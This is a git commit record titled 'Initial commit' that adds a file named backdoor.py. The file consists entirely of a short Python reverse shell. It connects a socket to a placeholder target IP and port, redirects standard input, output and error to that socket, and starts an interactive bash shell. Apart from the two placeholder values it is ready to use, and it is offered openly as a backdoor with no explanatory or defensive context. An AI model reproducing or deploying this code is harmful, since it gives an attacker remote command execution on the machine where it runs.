6cc89ec97a0da2a3f0c2c8bd000f0c6af9a34981
Zuhayer Aousaf <52472584+xuhayer@users.noreply.github.com>
2022-10-21 21:19:06 +1100

    Initial commit

---
+++ backdoor.py
@@ -0,0 +1,10 @@
+from os import dup2
+from subprocess import run
+import socket
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.connect(("Target IP",Target port)) 
+dup2(s.fileno(),0) 
+dup2(s.fileno(),1) 
+dup2(s.fileno(),2) 
+run(["/bin/bash","-i"])
+
